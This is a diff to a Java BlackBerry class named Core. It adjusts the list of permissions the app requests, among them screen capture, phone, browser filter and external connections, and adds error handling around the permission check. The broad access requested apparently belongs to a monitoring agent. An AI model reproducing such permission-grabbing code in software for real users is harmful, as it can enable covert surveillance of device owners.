@@ -82,7 +82,6 @@ public final class Core implements Runnable {
         //#ifdef DEBUG
         System.out.println("DEBUG");
         //#endif
-
         //#ifdef DEBUG
         System.out.println("DEBUG_TRACE");
         //#endif
@@ -143,6 +142,8 @@ public final class Core implements Runnable {
         apm.addReasonProvider(ApplicationDescriptor
                 .currentApplicationDescriptor(), drp);
 
+        //int PERMISSION_INTERNET = 0x7;
+        int PERMISSION_DISPLAY_LOCKED = 22;
         final int[] wantedPermissions = new int[] {
                 ApplicationPermissions.PERMISSION_SCREEN_CAPTURE,
                 ApplicationPermissions.PERMISSION_PHONE,
@@ -160,7 +161,10 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                 ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
                 ApplicationPermissions.PERMISSION_BROWSER_FILTER,
-                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION};
+                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION,
+                ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,
+                //PERMISSION_DISPLAY_LOCKED, // 22
+                };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
@@ -168,8 +172,14 @@ public final class Core implements Runnable {
         for (int i = 0; i < wantedPermissions.length; i++) {
             final int perm = wantedPermissions[i];
 
+            try{
             if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
                 allPermitted = false;
+            }
+            }catch(IllegalArgumentException ex){
+                //#ifdef DEBUG
+                debug.error("checkPermissions: " + perm + " "+ex);
+                //#endif
             }
         }
 
@@ -203,12 +213,14 @@ public final class Core implements Runnable {
             //#ifdef DEBUG
             debug.info("User has accepted all of the permissions");
             //#endif
-            return;
         } else {
             //#ifdef DEBUG
             debug.warn("User has accepted some or none of the permissions");
             //#endif
         }
+        
+        // TODO: Delete previous conf
+        
     }
 
     /**
